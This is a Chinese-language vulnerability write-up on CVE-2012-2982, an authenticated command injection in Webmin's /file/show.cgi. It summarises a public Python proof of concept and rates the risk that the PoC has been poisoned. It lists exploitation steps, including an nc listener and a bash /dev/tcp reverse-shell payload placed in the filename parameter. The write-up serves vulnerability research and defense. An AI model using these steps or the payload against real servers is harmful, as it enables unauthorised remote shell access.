## CVE-2012-2982 - Webmin 命令注入/RCE

**漏洞编号:** CVE-2012-2982

**漏洞类型:** 命令注入/RCE

**影响应用:** Webmin

**危害等级:** CRITICAL

**CVSS评分:** 10.0 (CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C)

**影响版本:** Webmin <= 1.580

**利用条件:** 需要有效凭证(身份验证后利用)

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析：该漏洞存在于Webmin 1.580及更早版本的/file/show.cgi组件中。漏洞根源在于后端在处理文件名参数时，未能正确过滤shell元字符。通过构造包含管道符或分号的特殊文件名请求，攻击者可以注入任意系统命令。本次分析的POC代码是一个基于Python 3编写的自动化利用脚本，其完整实现了从自动登录获取会话Cookie，到发送恶意Payload，再到建立反弹Shell的全过程。代码结构清晰，使用了标准的requests库进行HTTP交互。其核心利用逻辑在于向/file/show.cgi发送GET请求，并利用受影响参数注入bash反弹shell指令。代码中特别注明了Payload末尾必须携带'|'符号，这是因为Webmin后端在执行系统命令时会将输入拼接到管道流中，该符号确保了注入指令的闭合与独立执行。经评估，该POC在配置了正确凭证且目标版本匹配的情况下，具有极高的利用成功率。利用步骤：1. 环境准备，确保安装了Python 3及requests库；2. 在本地攻击机开启监听，例如使用nc -lvnp <port>；3. 修改或运行脚本，填入目标IP、端口、有效账号密码以及攻击机监听地址；4. 脚本首先访问session_login.cgi进行身份验证并获取sid cookie；5. 脚本携带cookie访问/file/show.cgi/bin/路径，并在参数中注入形如'| bash -i >& /dev/tcp/ip/port 0>&1 |'的Payload；6. 目标服务器执行该指令，反弹shell成功回连。投毒风险分析：该POC项目主要由知名安全研究员John Hammond维护或复现，代码具有极高的透明度。在投毒分析中，我们首先检查了网络连接部分，脚本仅与用户定义的目标主机进行交互，未发现向第三方匿名服务器（如C2服务器）发送数据的行为。其次，脚本内部逻辑纯粹，未对Payload进行任何混淆处理（Base64或十六进制编码），所有攻击指令均以明文形式存在，这符合安全研究和合规渗透测试工具的特征。代码中没有使用危险的eval()函数、动态加载远程代码（exec(requests.get(...).text)）或自动修改系统环境变量的操作。唯一潜在风险在于使用者如果直接运行未经审核的第三方修改版，可能面临Payload被篡改的风险，但在当前GitHub公开版本中，代码行为完全在README描述的预期范围内。该脚本采用标准的GPL或MIT风格开源分发，不含隐藏的后门逻辑，投毒风险评估为极低（10%以下），属于安全研究社区内高质量且安全的验证工具。

**项目地址:** [https://github.com/JohnHammond/CVE-2012-2982](https://github.com/JohnHammond/CVE-2012-2982)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2012-2982](https://nvd.nist.gov/vuln/detail/CVE-2012-2982)
